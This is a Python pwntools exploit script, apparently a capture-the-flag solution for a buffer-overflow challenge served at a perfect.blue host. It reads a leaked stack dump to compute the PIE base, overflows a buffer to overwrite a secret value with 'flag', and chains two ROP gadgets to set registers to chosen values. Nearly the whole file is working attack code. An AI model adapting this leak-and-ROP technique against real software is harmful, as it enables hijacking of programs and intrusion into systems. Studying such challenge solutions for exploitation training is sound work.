import pwn
import sys


def split_list(xs):
    mid = len(xs) // 2
    return xs[:mid], xs[mid:]


def split_stack(output):
    '''Parse the stack visualization in an arrow of 4-byte ints'''
    xs = output.split('|')
    xs = xs[1:]
    xs = [x for i, x in enumerate(xs) if i % 2 == 0]
    xs = [x.strip() for x in xs]
    xs = [x.split() for x in xs]
    xs = [split_list(x) for x in xs]

    ys = []
    for a, b in xs:
        ys.append(a)
        ys.append(b)

    xs = ys

    xs = [x[::-1] for x in xs]
    xs = [''.join(x) for x in xs]
    xs = [int(x, base=16) for x in xs]
    return xs


use_remote = False
debug = False
timeout = 0.5
if len(sys.argv) >= 2:
    use_remote = 'r' in sys.argv[1]
    debug = 'd' in sys.argv[1]

if use_remote:
    use_remote = 1

if use_remote:
    io = pwn.remote('maze.chal.perfect.blue', 1)
else:
    io = pwn.process('bof_mod.bin')

if debug:
    # Break right after the second `visualize` call
    pwn.gdb.attach(io, '''
break *(&vuln+289)
    ''')

io.sendlineafter('Do you want color in the visualization? (Y/n) ', 'n')
output = io.recvuntilS('Input some text: ')
print('Output:')
print(output)

stack = split_stack(output)
ret_addr = stack[-4]  # Original ret addr that goes to main+80
print("Original ret addr:", hex(ret_addr))

orig_ret_addr_no_pie = 0x1599
offset = ret_addr - orig_ret_addr_no_pie

payload = b'A' * (32 + 16) + pwn.p32(0x67616c66)

# Don't modify the stuff between `secret` and `ret addr`.
# Not necessary, but oh well.
secret_i = -8
payload += pwn.p32(stack[secret_i + 1])
payload += pwn.p32(stack[secret_i + 2])
payload += pwn.p32(stack[secret_i + 3])

# Desired
# mov $1, %eax;
# mov $0x31337, %edi;
# mov $0x1337, %esi; int3

# 0x1396: pop esi; pop edi; pop ebp; ret;
# 0x13ad: pop %eax; int3; ret

payload += pwn.p32(offset + 0x1396)  # pop esi; pop edi; pop ebp; ret;
payload += pwn.p32(0x1337)  # esi
payload += pwn.p32(0x31337)  # edi
payload += pwn.p32(0)  # ebp
payload += pwn.p32(offset + 0x13ad)  # pop %eax; int3; ret
payload += pwn.p32(1)  # eax

io.sendline(payload)
if use_remote:
    output = io.recvS()
else:
    output = io.recvuntilS('Return to address: ')
print(output)

io.stream()
io.close()
